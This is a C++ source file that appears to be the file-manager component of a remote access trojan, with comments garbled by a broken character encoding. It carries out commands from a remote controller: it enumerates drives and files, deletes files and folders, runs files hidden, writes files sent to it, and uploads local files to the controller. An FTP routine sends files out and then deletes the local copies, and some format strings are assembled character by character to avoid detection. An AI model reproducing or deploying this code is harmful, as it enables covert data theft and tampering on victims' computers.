#include "StdAfx.h"
#include "FileManager.h"
#include "KeyboardManager.h"

pFunFilterFile CFileManager::m_pFunFilterFile = NULL;
LPVOID CFileManager::m_pFunThis = NULL;

CFileManager::CFileManager(CClientSocket *pClient, BOOL bSend):CManager(pClient)
{
	m_nTransferMode = TRANSFER_MODE_NORMAL;

	//�����������б�,��ʼ�����ļ�����,�������߳�
	if (bSend)
	{
		SendDriveList();
	}
	InitializeCriticalSection(&m_cs);
}

CFileManager::~CFileManager()
{
	m_UploadList.clear();
	DeleteCriticalSection(&m_cs);
}

void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	__try
	{
		//dprintf(("CFileManagerAuto  %d",lpBuffer[0]));

		switch (lpBuffer[0])
		{
		case COMMAND_LIST_FILES:	//��ȡ�ļ��б�
			SendFilesList((char *)lpBuffer + 1);
			break;

		case COMMAND_DELETE_FILE:	//ɾ���ļ�
			DeleteFile((char *)lpBuffer + 1);
			SendToken(TOKEN_DELETE_FINISH);
			break;
		case COMMAND_DELETE_DIRECTORY:	//ɾ��Ŀ¼
			//printf("ɾ��Ŀ¼ %s\n", (char *)(bPacket + 1));
			DeleteDirectory((char *)lpBuffer + 1);
			SendToken(TOKEN_DELETE_FINISH);
			break;

		case COMMAND_DOWN_FILES: //�ϴ��ļ���С
			UploadToRemote(lpBuffer + 1);
			break;

		case COMMAND_CONTINUE: //�ϴ��ļ�����
			SendFileData(lpBuffer + 1);
			break;

		case COMMAND_CREATE_FOLDER:
			CreateFolder(lpBuffer + 1);
			break;

		case COMMAND_RENAME_FILE:
			Rename(lpBuffer + 1);
			break;

		case COMMAND_STOP:
			StopTransfer();
			break;

		case COMMAND_SET_TRANSFER_MODE:
			SetTransferMode(lpBuffer + 1);
			break;

		case COMMAND_FILE_SIZE:
			CreateLocalRecvFile(lpBuffer + 1);
			break;

		case COMMAND_FILE_DATA:
			WriteLocalRecvFile(lpBuffer + 1, nSize -1);
			break;

		case COMMAND_OPEN_FILE_SHOW:
			OpenFile((char *)lpBuffer + 1, SW_SHOW);
			break;

		case COMMAND_OPEN_FILE_HIDE:
			OpenFile((char *)lpBuffer + 1, SW_HIDE);
			break;

		default:
			break;
		}

	}
	__except(1)
	{

	}

}

BOOL CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	const char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt) 
	{
		return FALSE;
	}

	HKEY hKey = NULL;
	if (::RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS) 
	{
		return FALSE;
	}

	char strTemp[MAX_PATH] = {0};
	LONG nSize = sizeof(strTemp);
	::RegQueryValue(hKey, NULL, strTemp, &nSize);
	::RegCloseKey(hKey);
	
	char lpSubKey[500] = {0};
	::wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
	{
		return FALSE;
	}

	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	::RegQueryValue(hKey, NULL, strTemp, &nSize);
	::RegCloseKey(hKey);

	char *lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
	{
		lpstrCat = strstr(strTemp, "%1");
	}
	
	if (lpstrCat == NULL)
	{		
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
	{
		lstrcpy(lpstrCat, lpFile);
	}

	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
	{
		si.lpDesktop = "WinSta0\\Default"; 
	}
	
	::CreateProcess(NULL, strTemp, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	return TRUE;
}

UINT CFileManager::SendDriveList()
{
	//ǰһ���ֽ�Ϊ����,�����52�ֽ�Ϊ���������������
	BYTE DriveList[1024] = {0};
	DriveList[0] = TOKEN_DRIVE_LIST; //�������б�
	
	char DriveString[256] = {0};
	::GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	char *pDrive = DriveString;

	DWORD dwOffset = 0;
	for (dwOffset = 1; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)
	{
		//�õ��ļ�ϵͳ��Ϣ����С
		char FileSystem[MAX_PATH] = {0};		
		::GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		
		SHFILEINFO sfi = {0};
		::SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		
		int	nTypeNameLen = lstrlen(sfi.szTypeName) + 1;
		int	nFileSystemLen = lstrlen(FileSystem) + 1;
		
		ULONG AmntMB = 0; //�ܴ�С
		ULONG FreeMB = 0; //ʣ��ռ�

		//������̴�С
		UINT64 HDAmount = 0;
		UINT64 HDFreeSpace = 0;
		if (pDrive[0] != 'A' && pDrive[0] != 'B' && GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = (ULONG)(HDAmount / (1024 * 1024));
			FreeMB = (ULONG)(HDFreeSpace / (1024 * 1024));
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}

		//��ʼ��ֵ
		DriveList[dwOffset] = pDrive[0];
		DriveList[dwOffset + 1] = (BYTE)::GetDriveType(pDrive);
		
		//���̿ռ�����ռȥ��8�ֽ�
		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));
		
		//���̾��������������
		memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
		memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);
		
		dwOffset += 10 + nTypeNameLen + nFileSystemLen;
	}

	return Send((LPBYTE)DriveList, dwOffset);
}


UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	//���ô��䷽ʽ
	m_nTransferMode = TRANSFER_MODE_NORMAL;	

	UINT	nRet = 0;
	char	strPath[MAX_PATH];
	char	*pszFileName = NULL;
	DWORD	dwOffset = 0; //λ��ָ��
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; //�ȷ���10K�Ļ�����
	WIN32_FIND_DATA	FindFileData;
	
	LPBYTE lpList = (BYTE *)::LocalAlloc(LPTR, nBufferSize);
	
	::wsprintf(strPath, "%s\\*.*", lpszDirectory);
	HANDLE hFile = ::FindFirstFile(strPath, &FindFileData);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}
	
	*lpList = TOKEN_FILE_LIST;
	
	//1 Ϊ���ݰ�ͷ����ռ�ֽ�,���ֵ
	dwOffset = 1;
	/*
	�ļ�����	1
	�ļ���		strlen(filename) + 1 ('\0')
	�ļ���С	4
	*/
	do 
	{
		//��̬��չ������
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
			continue;
		//�ļ����� 1 �ֽ�
		*(lpList + dwOffset) = (BYTE)(FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY);
		dwOffset++;
		//�ļ��� lstrlen(pszFileName) + 1 �ֽ�
		nLen = lstrlen(pszFileName);
		memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		dwOffset++;
		
		//�ļ���С 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		//������ʱ�� 8 �ֽ�
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while(FindNextFile(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);
	
	LocalFree(lpList);
	FindClose(hFile);
	return nRet;
}


BOOL CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	char lpszFilter[MAX_PATH] = {0};
	wsprintf(lpszFilter, "%s\\*.*", lpszDirectory);
	
	WIN32_FIND_DATA	wfd = {0};
	HANDLE hFind = ::FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) //���û���ҵ������ʧ��
	{
		return FALSE;
	}

	char strBfz5[6] = {0};
	strBfz5[0] = '%';
	strBfz5[1] = 's';
	strBfz5[2] = '\\';
	strBfz5[3] = '%';
	strBfz5[4] = 's';
	strBfz5[5] = '\0';

	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH] = {0};
				::wsprintf(strDirectory, strBfz5, lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH] = {0};
				::wsprintf(strFile, strBfz5, lpszDirectory, wfd.cFileName);
				::DeleteFile(strFile);
			}
		}
	} while (::FindNextFile(hFind, &wfd));
	
	::FindClose(hFind); //�رղ��Ҿ��
	
	if(!::RemoveDirectory(lpszDirectory))
	{
		return FALSE;
	}

	return TRUE;
}

UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	//���浱ǰ���ڲ������ļ���
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	::lstrcpy(m_strCurrentProcessFileName, lpszFileName);

	DWORD dwSizeHigh = 0;
	DWORD dwSizeLow = -1;
	do 
	{
		HANDLE hFile = ::CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			break;
		}
		
		dwSizeLow = ::GetFileSize(hFile, &dwSizeHigh);
		::CloseHandle(hFile);

	} while (FALSE);
	
	
	//�������ݰ�,�����ļ�����
	int	nPacketSize = ::lstrlen(lpszFileName) + 10;
	BYTE *bPacket = (BYTE *)::LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);

	//1�ֽ�token, 8�ֽڴ�С,�ļ�����,'\0'
	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	memcpy(bPacket + 9, lpszFileName, lstrlen(lpszFileName) + 1);

	UINT nRet = Send(bPacket, nPacketSize);

	LocalFree(bPacket);

	return nRet;
}

UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	UINT		nRet = 0;
	FILESIZE	*pFileSize;
	char		*lpFileName;

	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;

	//Զ��������������һ��
	if (pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}
	HANDLE	hFile;
	
	
	
	hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return -1;

	
	
	
	CKeyboardManager::MySetFilePointer(hFile, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = 9; //1 + 4 + 4���ݰ�ͷ����С
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	//Token,  ��С��ƫ�ƣ��ļ���������
	lpPacket[0] = TOKEN_FILE_DATA;
	
	
	
	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
	ReadFile(hFile, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);


	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}

	
	
	
	LocalFree(lpPacket);

	return nRet;
}

//������һ���ļ�
void CFileManager::UploadNext()
{
	EnterCriticalSection(&m_cs);

	//ɾ��һ������
	m_UploadList.erase(0);
	//�����ϴ�����
	if(m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		//�ϴ���һ��
		SendFileSize(m_UploadList[0]);
	}
	LeaveCriticalSection(&m_cs);	

}

int CFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

void CALLBACK FtpCtrl_CallbackStatus(     HINTERNET hInternet,

									 DWORD dwContext,

									 DWORD dwInternetStatus,

									 LPVOID lpvStatusInformation,

									 DWORD dwStatusInformationLength)

{
	static int a;
	switch(dwInternetStatus)
	{
		// 	case INTERNET_STATUS_REQUEST_COMPLETE:
		// 		SetEvent((HANDLE)dwContext);
		// 		break;
	case INTERNET_STATUS_REQUEST_SENT:
		if (a==5)
		{
			SetEvent((HANDLE)dwContext);
			a=0;

		}
		a++;
		break;


	}


}

BOOL CFileManager::FtpUpLoad(TCHAR *szUrl,WORD dwFtpProt,TCHAR *szUserName,TCHAR *szPass,TCHAR *szLocalDir,TCHAR *szRemoteFileName)  
{  

	BOOL bRet=FALSE;
	//char buffer[100]={0};  
	HINTERNET hInternetSession=0;
	HINTERNET internetopenurl=0;
	HINTERNET hInternetConnect=0; 
	//HANDLE createfile=0;  



	__try
	{

		hInternetSession=InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,0,0,INTERNET_FLAG_NO_CACHE_WRITE);  

		if (hInternetSession==NULL)  
		{   
			dprintf(("Internet open failed! %d\r\n",GetLastError()));
			return bRet;  
		}

		InternetSetStatusCallback(hInternetSession, FtpCtrl_CallbackStatus);

		hInternetConnect = InternetConnect(hInternetSession,szUrl,dwFtpProt,szUserName,szPass,INTERNET_SERVICE_FTP,INTERNET_FLAG_PASSIVE|INTERNET_FLAG_EXISTING_CONNECT,0);

		if(NULL== hInternetConnect)
		{
			dprintf(("�޷�����   FTP   ������! %d\r\n",GetLastError()));
			return bRet;
		}
		//_asm int 3

		bRet = FtpSetCurrentDirectory(hInternetConnect,szRemoteFileName);
		if(!bRet)
		{
			FtpCreateDirectory(hInternetConnect,szRemoteFileName);
			FtpSetCurrentDirectory(hInternetConnect,szRemoteFileName);
		}

		if (szLocalDir[lstrlen((char *)szLocalDir) - 1] == '\\')
		{
			FixedUploadList((char *)szLocalDir);
			if (m_UploadList.empty())
			{
				StopTransfer();
				return TRUE;
			}
		}
		else
		{
			m_UploadList.push_back((char *)szLocalDir);
		}

		while(!m_UploadList.empty())
		{
		
			HANDLE hEvent = CreateEvent(NULL,FALSE,FALSE,TEXT("fd")); 

			dprintf(("FtpPutFile! %s\r\n",m_UploadList[0]));
			bRet=FtpPutFile(hInternetConnect, m_UploadList[0],StrRChrA(m_UploadList[0],NULL,'\\')+1,FTP_TRANSFER_TYPE_BINARY,(DWORD)hEvent);

			if (hEvent)
			{
				WaitForSingleObject(hEvent,1000*10);
				CloseHandle(hEvent);
			}

			DeleteFile(m_UploadList[0]);
			//ɾ��һ������
			m_UploadList.erase(0);
		}
		
	}
	__finally
	{
		if (hInternetSession)
		{
			InternetCloseHandle(hInternetSession);

		}
		if (hInternetConnect)
		{
			//		InternetConnect
			InternetCloseHandle(internetopenurl); 
		}
		//		 InternetCanonicalizeUrl()


	}

	//	CWriteLog::DestroyLogInstance();

	return bRet;

}

BOOL CFileManager::UploadToRemote(LPBYTE lpBuffer)
{
	if (lpBuffer[lstrlen((char *)lpBuffer) - 1] == '\\')
	{
		FixedUploadList((char *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer();
			return TRUE;
		}
	}
	else
	{
		m_UploadList.push_back((char *)lpBuffer);
	}

	//���͵�һ���ļ�
	return SendFileSize(m_UploadList[0]);

//	return TRUE;
}

BOOL CFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";

	char strBfz7[8] = {0};
	strBfz7[0] = '%';
	strBfz7[1] = 's';
	strBfz7[2] = '%';
	strBfz7[3] = 's';
	strBfz7[4] = '*';
	strBfz7[5] = '.';
	strBfz7[6] = '*';
	strBfz7[7] = '\0';

	wsprintf(lpszFilter, strBfz7, lpPathName, lpszSlash);

	
	
	
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) //���û���ҵ������ʧ��
		return FALSE;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				if (NULL == m_pFunFilterFile)
				{
					m_UploadList.push_back(strFile);
				}
				else
				{
					BOOL bRetDel = m_pFunFilterFile(m_pFunThis, strFile);
					if (bRetDel)
					{
						DeleteFile(strFile);
					}
					else
					{
						m_UploadList.push_back(strFile);
					}
				}

			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); //�رղ��Ҿ��
	return TRUE;
}

void CFileManager::StopTransfer()
{
	
	
	
	if (!m_UploadList.empty())
		m_UploadList.clear();
	
	
	
	SendToken(TOKEN_TRANSFER_FINISH);
}

void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	//���浱ǰ���ڲ������ļ���
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, (char *)lpBuffer + 8);

	//�����ļ�����
	m_nCurrentProcessFileLength = pFileSize->dwSizeHigh;
	m_nCurrentProcessFileLength = (m_nCurrentProcessFileLength << 32);
	m_nCurrentProcessFileLength += pFileSize->dwSizeLow;
	
	//�������Ŀ¼
	::MakeSureDirectoryPathExists(m_strCurrentProcessFileName);
	

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE);
	}
	else
	{
		GetFileData();
	}
	
	
	

	FindClose(hFind);
}

void CFileManager::GetFileData()
{
	
	
	
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}
	
	WIN32_FIND_DATA FindFileData;
	
	
	
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	// 1�ֽ�Token,���ֽ�ƫ�Ƹ���λ�����ֽ�ƫ�Ƶ���λ
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; //�ļ��򿪷�ʽ 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	
	
	
	
	//�ļ��Ѿ�����
	if (hFind != INVALID_HANDLE_VALUE)
	{
		//��ʾ��ʲô
		//���������
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
		//����
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			//ƫ����0
			memset(bToken + 1, 0, 8);
			//���´���
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		//������һ��
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		//ƫ����0
		memset(bToken + 1, 0, 8);
		//���´���
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);

	
	
	
	HANDLE	hFile = 
		CreateFile
		(
		m_strCurrentProcessFileName, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	//��Ҫ������
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	
	
	
	CloseHandle(hFile);

	Send(bToken, sizeof(bToken));
	
	
	

}

void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	//�������
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; //1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9
	FILESIZE	*pFileSize;
	//�õ����ݵ�ƫ��
	pData = lpBuffer + 8;
	
	pFileSize = (FILESIZE *)lpBuffer;

	//�õ��������ļ��е�ƫ��

	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	
	dwBytesToWrite = nSize - 8;
	
	
	
	
	HANDLE	hFile = 
		CreateFile
		(
		m_strCurrentProcessFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	
	
	
	
	CKeyboardManager::MySetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int nRet = 0;
		//д���ļ�
	nRet = WriteFile
		(
		hFile,
		pData, 
		dwBytesToWrite, 
		&dwBytesWrite,
		NULL
		);
//	if (nRet <= 0)
//		printf("�ļ�д��ʧ��");
	CloseHandle(hFile);
	//Ϊ�˱Ƚϣ�����������

	BYTE bToken[9] = {0};
	bToken[0] = TOKEN_DATA_CONTINUE;
	dwOffsetLow += dwBytesWrite;
	
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
}

void CFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	
	GetFileData();
}

void CFileManager::CreateFolder(LPBYTE lpBuffer)
{
	::MakeSureDirectoryPathExists((char *)lpBuffer);
	
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (char *)lpBuffer;
	LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;
	CKeyboardManager::MyMoveFile(lpExistingFileName, lpNewFileName);
	
	SendToken(TOKEN_RENAME_FINISH);
}


BOOL CFileManager::SetFilterFun(pFunFilterFile funFilter, LPVOID lpThis)
{
	m_pFunFilterFile = funFilter;
	m_pFunThis = lpThis;

	return TRUE;
}